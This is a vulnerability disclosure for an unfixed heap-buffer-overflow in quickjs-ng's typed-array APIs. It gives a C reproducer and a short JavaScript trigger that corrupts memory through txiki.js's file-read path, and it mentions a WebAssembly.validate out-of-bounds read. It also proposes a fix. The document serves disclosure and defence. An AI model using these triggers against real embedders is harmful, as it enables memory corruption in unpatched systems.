# quickjs-ng

Flawrence found this bug in [quickjs-ng](https://github.com/quickjs-ng/quickjs).
We reported it privately as GHSA-3pwq-gpm6-j3mf.
It is not fixed, so we publish the report here.
The downstream impact on txiki.js is described in [disclosures/txiki.js](../txiki.js/README.md).

## Stale typed array length after a resizable ArrayBuffer shrinks

Affected code: quickjs.c, `JS_GetUint8Array()` and `JS_GetTypedArrayBuffer()`.

On a length-tracking typed array backed by a resizable ArrayBuffer, shrinking the buffer updates `p->u.array.count` and the backing allocation, but leaves `ta->length` at its creation-time byte length. Both public C APIs return `ta->length`. The result is a pointer to the current small allocation paired with the old large size.

This is present on current master 82626ea and released v0.16.1. Resizable ArrayBuffer support introduced the condition in 37fe427.

Recent-master C reproducer:

```c
static const char source[] =
    "globalThis.ta = (() => {"
    " const rab = new ArrayBuffer(65536, { maxByteLength: 65536 });"
    " const ta = new Uint8Array(rab);"
    " rab.resize(8);"
    " return ta;"
    "})();";
JSRuntime *rt = JS_NewRuntime();
JSContext *ctx = JS_NewContext(rt);
JSValue result = JS_Eval(ctx, source, sizeof(source) - 1,
                         "<poc>", JS_EVAL_TYPE_GLOBAL);
JSValue global = JS_GetGlobalObject(ctx);
JSValue ta = JS_GetPropertyStr(ctx, global, "ta");
size_t size, backing_size;
uint8_t *data = JS_GetUint8Array(ctx, &size, ta);
JSValue buffer = JS_GetTypedArrayBuffer(ctx, ta, NULL, NULL, NULL);
JS_GetArrayBuffer(ctx, &backing_size, buffer);
printf("size=%zu backing=%zu\n", size, backing_size);
memset(data, 0x41, size);
```

On ASan master this prints `size=65536 backing=8` and reports a 65,536-byte heap-buffer-overflow write immediately after the resized allocation.

### Concrete untrusted-JavaScript path

txiki.js v26.6.0 vendors affected quickjs-ng commit bf8988f. Its public `tjs.open().read()` path calls `JS_GetUint8Array()` in src/utils.c:242, places the returned pointer and stale size in `uv_buf_t` in src/mod_fs.c:445, then passes it to `uv_fs_read()` at src/mod_fs.c:451.

The complete ordinary-JavaScript trigger is:

```js
const rab = new ArrayBuffer(65536, { maxByteLength: 65536 });
const view = new Uint8Array(rab);
rab.resize(1);
const file = await tjs.open('/dev/zero', 'r');
try {
    await file.read(view);
} finally {
    await file.close();
}
```

No internal module, FFI, malformed bytecode, or crafted C input is needed. On the released txiki.js v26.6.0 ASan build, 10/10 runs aborted with native memory-safety failures: nine direct heap-buffer-overflow writes and one downstream invalid free after corruption. A secondary public `WebAssembly.validate(view)` path produces a 65,536-byte OOB read in 10/10 runs.

The standalone qjs CLI has no identified ordinary-JavaScript consumer of these C APIs. The concrete impact is in embedders such as txiki.js that expose a native consumer to untrusted source.

### Proposed fix

```c
// JS_GetUint8Array
*psize = p->u.array.count;

// JS_GetTypedArrayBuffer
*pbyte_length = (size_t)p->u.array.count <<
                typed_array_size_log2(p->class_id);
```

I added regression coverage to api-test.c for shrunken length-tracking Uint8Array and Int32Array views. On ASan master, api-test passes and the suite reports 0/90 errors with 9 excluded. The patched C reproducer reports `size=8 backing=8`. Both txiki.js PoCs exit cleanly in 10/10 patched runs.

Concrete classifications are CWE-787 for the demonstrated file-read path and CWE-125 for the `WebAssembly.validate` path.

Coordinated downstream report: GHSA-gfvw-rpjq-557g.
